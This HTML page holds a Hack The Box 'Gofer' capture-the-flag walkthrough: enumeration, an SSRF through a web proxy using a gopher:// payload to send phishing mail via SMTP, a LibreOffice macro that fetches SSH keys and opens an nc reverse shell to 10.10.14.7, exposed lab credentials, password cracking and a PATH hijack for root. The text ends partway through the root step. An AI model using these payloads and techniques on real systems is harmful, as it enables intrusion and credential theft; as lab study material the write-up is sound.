<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self' https://www.dropbox.com https://*.dl.dropboxusercontent.com https://photos.app.goo.gl https://drive.google.com https://photos.google.com https://video-downloads.googleusercontent.com https://*.googleusercontent.com https://*.googlevideo.com https://youtube.googleapis.com; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self' https://w.soundcloud.com https://www.youtube.com https://www.youtube-nocookie.com https://www.dropbox.com http://localhost https://www.dropbox.com http://darvein.local https://disqus.com; img-src 'self' https://photos.google.com https://lh3.googleusercontent.com https://www.dropbox.com https://*.dl.dropboxusercontent.com https://*.disqus.com https://c.disquscdn.com; object-src https://lh3.googleusercontent.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/ https://c.disquscdn.com; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdnjs.cloudflare.com https://www.googletagmanager.com https://www.dropbox.com http://localhost http://darvein.local https://drv21.disqus.com https://c.disquscdn.com; prefetch-src 'self' https://youtube.googleapis.com; connect-src 'self' https://www.google-analytics.com https://links.services.disqus.com;"><meta name=author content="Dennis Ruiz"><meta name=description content="hard - Gofer User Flag Directory index: http://gofer.htb/assets/img/ Nothing unusual in the html source code. No special links, no weird comments. What JS libs are being used:
assets/vendor/aos/aos.js assets/vendor/bootstrap/js/bootstrap.bundle.min.js assets/vendor/glightbox/js/glightbox.min.js assets/vendor/isotope-layout/isotope.pkgd.min.js assets/vendor/php-email-form/validate.js assets/vendor/swiper/swiper-bundle.min.js Ok, what about port scanning?
~z➤ sudo nmap -n -Pn -sV -O -T4 gofer.htb ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 25/tcp filtered smtp 80/tcp open http Apache httpd 2."><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="hard - Gofer User Flag Directory index: http://gofer.htb/assets/img/ Nothing unusual in the html source code. No special links, no weird comments. What JS libs are being used:
assets/vendor/aos/aos.js assets/vendor/bootstrap/js/bootstrap.bundle.min.js assets/vendor/glightbox/js/glightbox.min.js assets/vendor/isotope-layout/isotope.pkgd.min.js assets/vendor/php-email-form/validate.js assets/vendor/swiper/swiper-bundle.min.js Ok, what about port scanning?
~z➤ sudo nmap -n -Pn -sV -O -T4 gofer.htb ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 25/tcp filtered smtp 80/tcp open http Apache httpd 2."><meta property="og:title" content><meta property="og:description" content="hard - Gofer User Flag Directory index: http://gofer.htb/assets/img/ Nothing unusual in the html source code. No special links, no weird comments. What JS libs are being used:
assets/vendor/aos/aos.js assets/vendor/bootstrap/js/bootstrap.bundle.min.js assets/vendor/glightbox/js/glightbox.min.js assets/vendor/isotope-layout/isotope.pkgd.min.js assets/vendor/php-email-form/validate.js assets/vendor/swiper/swiper-bundle.min.js Ok, what about port scanning?
~z➤ sudo nmap -n -Pn -sV -O -T4 gofer.htb ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 25/tcp filtered smtp 80/tcp open http Apache httpd 2."><meta property="og:type" content="article"><meta property="og:url" content="https://www.darvein.net/infosec/htb/machines/hard/gofer/"><meta property="article:section" content="infosec"><title>hard - Gofer </title><link rel=canonical href=https://www.darvein.net/infosec/htb/machines/hard/gofer/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.a1a7e7e7bd8b6629931805334fd6cf056ee6f154702847e6d597bbfe80446a0d.css integrity="sha256-oafn572LZimTGAUzT9bPBW7m8VRwKEfm1Ze7/oBEag0=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.39e41a7f16bdf8cb16e43cae7d714fa1016f1d2d2898a5b3f27f42c9979204e2.css integrity="sha256-OeQafxa9+MsW5DyufXFPoQFvHS0omKWz8n9CyZeSBOI=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/custom.min.7cf8a329bb485491ed5be45bd286916c655bf66e11e3fe4d82649437eae8b51b.css integrity="sha256-fPijKbtIVJHtW+Rb0oaRbGVb9m4R4/5NgmSUN+rotRs=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5><meta name=generator content="Hugo 0.120.4"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Darvein
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/infosec/>Infosec</a></li><li class=navigation-item><a class=navigation-link href=/coding/>Coding</a></li><li class=navigation-item><a class=navigation-link href=/devops/>Devops</a></li></ul></section></nav><div class=content><section class="container page"><article><h1 id=hard---gofer>hard - Gofer
<a class=heading-link href=#hard---gofer><i class="fa fa-link" aria-hidden=true></i></a></h1><h2 id=user-flag>User Flag
<a class=heading-link href=#user-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><ul><li>Directory index:
<a href=http://gofer.htb/assets/img/>http://gofer.htb/assets/img/</a>
Nothing unusual in the html source code. No special links, no weird comments.</li></ul><p>What JS libs are being used:</p><ul><li>assets/vendor/aos/aos.js</li><li>assets/vendor/bootstrap/js/bootstrap.bundle.min.js</li><li>assets/vendor/glightbox/js/glightbox.min.js</li><li>assets/vendor/isotope-layout/isotope.pkgd.min.js</li><li>assets/vendor/php-email-form/validate.js</li><li>assets/vendor/swiper/swiper-bundle.min.js</li></ul><p>Ok, what about port scanning?</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ sudo nmap -n -Pn -sV -O -T4 gofer.htb
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>PORT    STATE    SERVICE     VERSION
</span></span><span style=display:flex><span>22/tcp  open     ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
</span></span><span style=display:flex><span>25/tcp  filtered smtp
</span></span><span style=display:flex><span>80/tcp  open     http        Apache httpd 2.4.56
</span></span><span style=display:flex><span>139/tcp open     netbios-ssn Samba smbd 4.6.2
</span></span><span style=display:flex><span>445/tcp open     netbios-ssn Samba smbd 4.6.2
</span></span><span style=display:flex><span>No exact OS matches <span style=color:#fb660a;font-weight:700>for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).
</span></span></code></pre></div><h4 id=samba-service>Samba service!
<a class=heading-link href=#samba-service><i class="fa fa-link" aria-hidden=true></i></a></h4><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ smbclient -N  -L gofer.htb/shares/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Sharename       Type      Comment
</span></span><span style=display:flex><span>        ---------       ----      -------
</span></span><span style=display:flex><span>        print$          Disk      Printer Drivers
</span></span><span style=display:flex><span>        shares          Disk
</span></span><span style=display:flex><span>        IPC$            IPC       IPC Service (Samba 4.13.13-Debian)
</span></span><span style=display:flex><span>SMB1 disabled -- no workgroup available
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>~z➤ smbclient -N //gofer.htb/shares
</span></span><span style=display:flex><span>Try <span style=color:#0086d2>&#34;help&#34;</span> to get a list of possible commands.
</span></span><span style=display:flex><span>smb: <span style=color:#0086d2>\&gt;</span> ls
</span></span><span style=display:flex><span>  .                                   D        <span style=color:#0086f7;font-weight:700>0</span>  Fri Oct <span style=color:#0086f7;font-weight:700>28</span> 15:32:08 <span style=color:#0086f7;font-weight:700>2022</span>
</span></span><span style=display:flex><span>  ..                                  D        <span style=color:#0086f7;font-weight:700>0</span>  Fri Apr <span style=color:#0086f7;font-weight:700>28</span> 07:59:34 <span style=color:#0086f7;font-weight:700>2023</span>
</span></span><span style=display:flex><span>  .backup                            DH        <span style=color:#0086f7;font-weight:700>0</span>  Thu Apr <span style=color:#0086f7;font-weight:700>27</span> 08:49:32 <span style=color:#0086f7;font-weight:700>2023</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#0086f7;font-weight:700>5061888</span> blocks of size 1024. <span style=color:#0086f7;font-weight:700>2172964</span> blocks available
</span></span><span style=display:flex><span>smb: <span style=color:#0086d2>\&gt;</span> cd .backup
</span></span><span style=display:flex><span>smb: <span style=color:#0086d2>\.</span>backup<span style=color:#0086d2>\&gt;</span> ls
</span></span><span style=display:flex><span>  .                                   D        <span style=color:#0086f7;font-weight:700>0</span>  Thu Apr <span style=color:#0086f7;font-weight:700>27</span> 08:49:32 <span style=color:#0086f7;font-weight:700>2023</span>
</span></span><span style=display:flex><span>  ..                                  D        <span style=color:#0086f7;font-weight:700>0</span>  Fri Oct <span style=color:#0086f7;font-weight:700>28</span> 15:32:08 <span style=color:#0086f7;font-weight:700>2022</span>
</span></span><span style=display:flex><span>  mail                                N     <span style=color:#0086f7;font-weight:700>1101</span>  Thu Apr <span style=color:#0086f7;font-weight:700>27</span> 08:49:32 <span style=color:#0086f7;font-weight:700>2023</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#0086f7;font-weight:700>5061888</span> blocks of size 1024. <span style=color:#0086f7;font-weight:700>2172964</span> blocks available
</span></span><span style=display:flex><span>smb: <span style=color:#0086d2>\.</span>backup<span style=color:#0086d2>\&gt;</span> get mail
</span></span><span style=display:flex><span>getting file <span style=color:#0086d2>\.</span>backup<span style=color:#0086d2>\m</span>ail of size <span style=color:#0086f7;font-weight:700>1101</span> as mail (2.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)
</span></span></code></pre></div><p>Reading the file:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ cat mail
</span></span><span style=display:flex><span>From jdavis@gofer.htb  Fri Oct <span style=color:#0086f7;font-weight:700>28</span> 20:29:30 <span style=color:#0086f7;font-weight:700>2022</span>
</span></span><span style=display:flex><span>Return-Path: &lt;jdavis@gofer.htb&gt;
</span></span><span style=display:flex><span>X-Original-To: tbuckley@gofer.htb
</span></span><span style=display:flex><span>Delivered-To: tbuckley@gofer.htb
</span></span><span style=display:flex><span>Received: from gofer.htb (localhost [127.0.0.1])
</span></span><span style=display:flex><span>        by gofer.htb (Postfix) with SMTP id C8F7461827
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>for</span> &lt;tbuckley@gofer.htb&gt;; Fri, <span style=color:#0086f7;font-weight:700>28</span> Oct <span style=color:#0086f7;font-weight:700>2022</span> 20:28:43 +0100 (BST)
</span></span><span style=display:flex><span>Subject:Important to read!
</span></span><span style=display:flex><span>Message-Id: &lt;20221028192857.C8F7461827@gofer.htb&gt;
</span></span><span style=display:flex><span>Date: Fri, <span style=color:#0086f7;font-weight:700>28</span> Oct <span style=color:#0086f7;font-weight:700>2022</span> 20:28:43 +0100 (BST)
</span></span><span style=display:flex><span>From: jdavis@gofer.htb
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Hello guys,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That<span style=color:#0086d2>&#39;s why from now on, I&#39;</span>ve decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS: Last thing <span style=color:#fb660a;font-weight:700>for</span> Tom; I know you&#39;re working on our web proxy but <span style=color:#fb660a;font-weight:700>if</span> you could restrict access, it will be more secure <span style=color:#fb660a;font-weight:700>until</span> you have finished it. It seems to me that it should be possible to <span style=color:#fb660a;font-weight:700>do</span> so via &lt;Limit&gt;
</span></span></code></pre></div><p>Nice story, so we have:</p><ul><li>An internal Email service</li><li>The internal email service might be exploitable via .odt documents</li><li>There is a WIP web proxy service</li><li>Users:<ul><li><a href=../mailto:jdavis@gofer.htb>jdavis@gofer.htb</a></li><li><a href=../mailto:tbuckley@gofer.htb>tbuckley@gofer.htb</a></li></ul></li></ul><h4 id=exploiting-gopher-service>Exploiting gopher service
<a class=heading-link href=#exploiting-gopher-service><i class="fa fa-link" aria-hidden=true></i></a></h4><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://gofer.htb/ -H <span style=color:#0086d2>&#34;Host: FUZZ.gofer.htb&#34;</span> -fc <span style=color:#0086f7;font-weight:700>301</span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>[Status: 401, Size: 462, Words: 42, Lines: 15, Duration: 134ms]
</span></span><span style=display:flex><span>    * FUZZ: proxy
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>:: Progress: [4989/4989] :: Job [1/1] :: <span style=color:#0086f7;font-weight:700>296</span> req/sec :: Duration: [0:00:17] :: Errors: <span style=color:#0086f7;font-weight:700>0</span> ::
</span></span></code></pre></div><p>So that should be the proxy which is not yet protected, it is accepting POST requests:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ curl -X GET proxy.gofer.htb/index.php
</span></span><span style=display:flex><span>&lt;!DOCTYPE HTML PUBLIC <span style=color:#0086d2>&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
</span></span><span style=display:flex><span>&lt;html&gt;&lt;head&gt;
</span></span><span style=display:flex><span>&lt;title&gt;401 Unauthorized&lt;/title&gt;
</span></span><span style=display:flex><span>&lt;/head&gt;&lt;body&gt;
</span></span><span style=display:flex><span>&lt;h1&gt;Unauthorized&lt;/h1&gt;
</span></span><span style=display:flex><span>&lt;p&gt;This server could not verify that you
</span></span><span style=display:flex><span>are authorized to access the document
</span></span><span style=display:flex><span>requested.  Either you supplied the wrong
</span></span><span style=display:flex><span>credentials (e.g., bad password), or your
</span></span><span style=display:flex><span>browser doesn&#39;t understand how to supply
</span></span><span style=display:flex><span>the credentials required.&lt;/p&gt;
</span></span><span style=display:flex><span>&lt;hr&gt;
</span></span><span style=display:flex><span>&lt;address&gt;Apache/2.4.56 (Debian) Server at proxy.gofer.htb Port 80&lt;/address&gt;
</span></span><span style=display:flex><span>&lt;/body&gt;&lt;/html&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>~z➤ curl -X POST proxy.gofer.htb/index.php
</span></span><span style=display:flex><span>&lt;!-- Welcome to Gofer proxy --&gt;
</span></span><span style=display:flex><span>&lt;html&gt;&lt;body&gt;Missing URL parameter !&lt;/body&gt;&lt;/html&gt;%
</span></span></code></pre></div><p>That proxy is trying to pull data from the given url:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ curl -X POST <span style=color:#0086d2>&#34;proxy.gofer.htb/index.php?url=http://10.10.14.7:6666/foo&#34;</span>
</span></span><span style=display:flex><span>&lt;!-- Welcome to Gofer proxy --&gt;
</span></span><span style=display:flex><span>&lt;!DOCTYPE HTML&gt;
</span></span><span style=display:flex><span>&lt;html <span style=color:#fb660a>lang</span>=<span style=color:#0086d2>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span>    &lt;head&gt;
</span></span><span style=display:flex><span>        &lt;meta <span style=color:#fb660a>charset</span>=<span style=color:#0086d2>&#34;utf-8&#34;</span>&gt;
</span></span><span style=display:flex><span>        &lt;title&gt;Error response&lt;/title&gt;
</span></span><span style=display:flex><span>    &lt;/head&gt;
</span></span><span style=display:flex><span>    &lt;body&gt;
</span></span><span style=display:flex><span>        &lt;h1&gt;Error response&lt;/h1&gt;
</span></span><span style=display:flex><span>        &lt;p&gt;Error code: 404&lt;/p&gt;
</span></span><span style=display:flex><span>        &lt;p&gt;Message: File not found.&lt;/p&gt;
</span></span><span style=display:flex><span>        &lt;p&gt;Error code explanation: <span style=color:#0086f7;font-weight:700>404</span> - Nothing matches the given URI.&lt;/p&gt;
</span></span><span style=display:flex><span>    &lt;/body&gt;
</span></span><span style=display:flex><span>&lt;/html&gt;
</span></span><span style=display:flex><span>1%
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>.../infosec/htb/p8➤ python -m http.server <span style=color:#0086f7;font-weight:700>6666</span>
</span></span><span style=display:flex><span>Serving HTTP on 0.0.0.0 port <span style=color:#0086f7;font-weight:700>6666</span> (http://0.0.0.0:6666/) ...
</span></span><span style=display:flex><span>10.10.11.225 - - [31/Aug/2023 10:10:51] code 404, message File not found
</span></span><span style=display:flex><span>10.10.11.225 - - [31/Aug/2023 10:10:51] <span style=color:#0086d2>&#34;GET /foo HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>404</span> -
</span></span></code></pre></div><p>Creating a macro with rev shell<figure class=image-container><a href=/i/2023-08-31_10-23.png><img width=100% src=/i/2023-08-31_10-23.png alt="Libreoffice macro rev shell"></a><figcaption>&#8213; Libreoffice macro rev shell &#8213;</figcaption></figure></p><p>LibreOffice Macro:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>REM  *****  BASIC  *****
</span></span><span style=display:flex><span>Sub Main
</span></span><span style=display:flex><span> Shell(<span style=color:#0086d2>&#34;mkdir -p /home/jhudson/.ssh&#34;</span>)
</span></span><span style=display:flex><span> Shell(<span style=color:#0086d2>&#34;curl 10.10.14.7:6666/authorized_keys --output /home/jhudson/.ssh/authorized_keys&#34;</span>)
</span></span><span style=display:flex><span> Shell(<span style=color:#0086d2>&#34;chmod 600 /home/jhudson/.ssh/authorized_keys&#34;</span>)
</span></span><span style=display:flex><span> Shell(<span style=color:#0086d2>&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.14.7 55555 &gt;/tmp/f&#34;</span>)
</span></span><span style=display:flex><span>End Sub
</span></span></code></pre></div><p>The payload:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-txt data-lang=txt><span style=display:flex><span>gopher://2130706433:25/xHELO%20gofer.htb%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cjhudson@gofer.htb%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cjhudson@gofer.htb%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%20&lt;a+href%3d&#39;http%3a//10.10.14.7:6666/shell.odt&gt;this&lt;/a&gt;%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 
</span></span></code></pre></div><p>Triggering the exploit:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ curl -X POST <span style=color:#0086d2>&#34;proxy.gofer.htb/index.php?url=gopher://2130706433:25/xHELO%20gofer.htb%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cjhudson@gofer.htb%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cjhudson@gofer.htb%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%20&lt;a+href%3d&#39;http%3a//10.10.14.7:6666/shell.odt&gt;this&lt;/a&gt;%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a&#34;</span>
</span></span><span style=display:flex><span>&lt;!-- Welcome to Gofer proxy --&gt;
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>220</span> gofer.htb ESMTP Postfix (Debian/GNU)
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>250</span> gofer.htb
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>250</span> 2.1.0 Ok
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>250</span> 2.1.5 Ok
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>354</span> End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>250</span> 2.0.0 Ok: queued as 4D4EF806D
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>221</span> 2.0.0 Bye
</span></span><span style=display:flex><span>1%
</span></span></code></pre></div><p>SSHing into jhudson user:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>.../infosec/htb/p8➤ ssh -i ./kkk jhudson@gofer.htb
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>jhudson@gofer:~$ id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1000(jhudson) <span style=color:#fb660a>gid</span>=1000(jhudson) <span style=color:#fb660a>groups</span>=1000(jhudson),108(netdev)
</span></span><span style=display:flex><span>jhudson@gofer:~$ ls
</span></span><span style=display:flex><span>Downloads  user.txt
</span></span></code></pre></div><h2 id=root-flag>Root Flag
<a class=heading-link href=#root-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>Searching for SUID bins:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>jhudson@gofer:~$ find / -type f -perm -4000 2&gt;/dev/null
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>/usr/bin/chfn
</span></span><span style=display:flex><span>/usr/bin/newgrp
</span></span><span style=display:flex><span>/usr/local/bin/notes
</span></span><span style=display:flex><span>jhudson@gofer:~$ ls -ltra /usr/local/bin/notes
</span></span><span style=display:flex><span>-rwsr-s--- <span style=color:#0086f7;font-weight:700>1</span> root dev <span style=color:#0086f7;font-weight:700>17168</span> Apr <span style=color:#0086f7;font-weight:700>28</span> 16:06 /usr/local/bin/notes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>jhudson@gofer:~$ id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1000(jhudson) <span style=color:#fb660a>gid</span>=1000(jhudson) <span style=color:#fb660a>groups</span>=1000(jhudson),108(netdev)
</span></span></code></pre></div><p>HTTP Creds!</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-fallback data-lang=fallback><span style=display:flex><span>jhudson@gofer:/etc/apache2/sites-enabled$ cat /etc/apache2/.htpasswd
</span></span><span style=display:flex><span>tbuckley:$apr1$YcZb9OIz$fRzQMx20VskXgmH65jjLh/
</span></span></code></pre></div><p>nono</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>.../infosec/htb/p8➤ echo <span style=color:#0086d2>&#39;dGJ1Y2tsZXk6b29QNGRpZXRpZTNvX2hxdWFldGk=&#39;</span> | base64 -d
</span></span><span style=display:flex><span>tbuckley:ooP4dietie3o_hquaeti
</span></span></code></pre></div><p>sshing into tbuckley:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>.../infosec/htb/p8➤ ssh tbuckley@gofer.htb
</span></span><span style=display:flex><span>tbuckley@gofer.htb&#39;s password:
</span></span><span style=display:flex><span>Linux gofer.htb 5.10.0-23-amd64 <span style=color:#080;background-color:#0f140f;font-style:italic>#1 SMP Debian 5.10.179-2 (2023-07-14) x86_64</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>The programs included with the Debian GNU/Linux system are free software;
</span></span><span style=display:flex><span>the exact distribution terms <span style=color:#fb660a;font-weight:700>for</span> each program are described in the
</span></span><span style=display:flex><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style=display:flex><span>permitted by applicable law.
</span></span><span style=display:flex><span>You have no mail.
</span></span><span style=display:flex><span>tbuckley@gofer:~$ ls
</span></span><span style=display:flex><span>tbuckley@gofer:~$ id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1002(tbuckley) <span style=color:#fb660a>gid</span>=1002(tbuckley) <span style=color:#fb660a>groups</span>=1002(tbuckley),1004(dev)
</span></span></code></pre></div><p>Cracking httpasswd</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>.../infosec/htb/p8➤ john  --wordlist=/usr/share/dict/rockyou.txt pass
</span></span><span style=display:flex><span>Warning: detected hash type <span style=color:#0086d2>&#34;md5crypt&#34;</span>, but the string is also recognized as <span style=color:#0086d2>&#34;md5crypt-long&#34;</span>
</span></span><span style=display:flex><span>Use the <span style=color:#0086d2>&#34;--format=md5crypt-long&#34;</span> option to force loading these as that type instead
</span></span><span style=display:flex><span>Warning: detected hash type <span style=color:#0086d2>&#34;md5crypt&#34;</span>, but the string is also recognized as <span style=color:#0086d2>&#34;md5crypt-opencl&#34;</span>
</span></span><span style=display:flex><span>Use the <span style=color:#0086d2>&#34;--format=md5crypt-opencl&#34;</span> option to force loading these as that type instead
</span></span><span style=display:flex><span>Using default input encoding: UTF-8
</span></span><span style=display:flex><span>Loaded <span style=color:#0086f7;font-weight:700>1</span> password hash (md5crypt, crypt(3) <span style=color:#fb660a>$1</span>$ (and variants) [MD5 128/128 AVX 4x3])
</span></span><span style=display:flex><span>Will run <span style=color:#0086f7;font-weight:700>12</span> OpenMP threads
</span></span><span style=display:flex><span>Press <span style=color:#0086d2>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#fb660a;font-weight:700>for</span> status
</span></span><span style=display:flex><span>0g 0:00:01:46 DONE (2023-08-31 11:44) 0g/s 132295p/s 132295c/s 132295C/s  edizzle69..*7¡Vamos!
</span></span><span style=display:flex><span>Session completed
</span></span></code></pre></div><p>We can now run the notes app:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>tbuckley@gofer:~$ /usr/local/bin/notes
</span></span><span style=display:flex><span>========================================
</span></span><span style=display:flex><span>1) Create an user and choose an username
</span></span><span style=display:flex><span>2) Show user information
</span></span><span style=display:flex><span>3) Delete an user
</span></span><span style=display:flex><span>4) Write a note
</span></span><span style=display:flex><span>5) Show a note
</span></span><span style=display:flex><span>6) Save a note (not yet implemented)
</span></span><span style=display:flex><span>7) Delete a note
</span></span><span style=display:flex><span>8) Backup notes
</span></span><span style=display:flex><span>9) <span style=color:#fb660a>Quit</span>
</span></span><span style=display:flex><span>========================================
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Your choice:
</span></span></code></pre></div><p>tricking tar:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>tbuckley@gofer:~$ export <span style=color:#fb660a>PATH</span>=/home/tbuckley:<span style=color:#fb660a>$PATH</span>
</span></span><span style=display:flex><span>tbuckley@gofer:~$ ls
</span></span><span style=display:flex><span>tar
</span></span><span style=display:flex><span>tbuckley@gofer:~$ cat tar
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>#!/bin/bash</span>
</span></span><span style=display:flex><span>/bin/bash
